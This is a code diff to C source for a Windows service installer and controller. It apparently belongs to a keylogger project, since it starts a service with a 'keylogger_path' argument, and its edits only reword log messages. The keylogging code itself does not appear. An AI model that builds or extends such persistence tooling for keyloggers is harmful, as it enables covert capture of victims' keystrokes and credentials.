@@ -395,10 +395,10 @@ static void install_service(SC_HANDLE scm)
     // Check if the service creation failed.
     // If successful, print a success message; otherwise, print an error.
     if (service == NULL) {
-        print_error("Failed to create service");
+        print_error("Failed to create {" SVC_NAME "} service");
     }
     else {
-        printf("Service installed successfully\n");
+        printf("Service {" SVC_NAME "} installed successfully\n");
         CloseServiceHandle(service);
     }
 
@@ -412,7 +412,7 @@ static void start_service(SC_HANDLE scm)
     // This handle is used to interact with the service (e.g., start, stop).
     SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_ALL_ACCESS);
     if (service == NULL) {
-        print_error("Failed to open service");
+        print_error("Failed to open {" SVC_NAME "} service");
         CloseServiceHandle(scm);
         return;
     }
@@ -433,10 +433,10 @@ static void start_service(SC_HANDLE scm)
     // The function StartService does not return until the service is either running or in a start-pending state.
     const char* args[] = { keylogger_path };
     if (!StartService(service, 1, args)) {
-        print_error("Failed to start service");
+        print_error("Failed to start {" SVC_NAME "} service");
     }
     else {
-        printf("Service started succesfully\n");
+        printf("Service {" SVC_NAME "} started succesfully\n");
     }
 
     // Close the handles to the service and SCM once operations are complete.
@@ -450,7 +450,7 @@ static void stop_service(SC_HANDLE scm)
     // This handle is used to interact with the service (specifically, to stop it).
     SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_STOP);
     if (service == NULL) {
-        print_error("Failed to open service");
+        print_error("Failed to open {" SVC_NAME "} service");
         CloseServiceHandle(scm);
         return;
     }
@@ -459,10 +459,10 @@ static void stop_service(SC_HANDLE scm)
     // The ControlService function sends a control code (SERVICE_CONTROL_STOP) to the service to stop it.
     SERVICE_STATUS status;
     if (!ControlService(service, SERVICE_CONTROL_STOP, &status)) {
-        print_error("Failed to stop service");
+        print_error("Failed to stop {" SVC_NAME "} service");
     }
     else {
-        printf("Service stopped successfully\n");
+        printf("Service {" SVC_NAME "} stopped successfully\n");
     }
 
     // Close the handles to the service and SCM once operations are complete.
@@ -500,7 +500,7 @@ static void delete_service(SC_HANDLE scm)
     SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_ALL_ACCESS);
     if (service == NULL) {
         // Log an error if opening the service fails.
-        print_error("Failed to open service");
+        print_error("Failed to open {" SVC_NAME "} service");
         CloseServiceHandle(scm);
         return;
     }
@@ -514,10 +514,10 @@ static void delete_service(SC_HANDLE scm)
     // Attempt to delete the service.
     // If DeleteService fails, log an error; otherwise, confirm successful deletion.
     if (!DeleteService(service)) {
-        print_error("Failed to delete service");
+        print_error("Failed to delete {" SVC_NAME "} service");
     }
     else {
-        printf("Service deleted successfully\n");
+        printf("Service {" SVC_NAME "} deleted successfully\n");
     }
 
     // Close the handles to the service and the Service Control Manager.
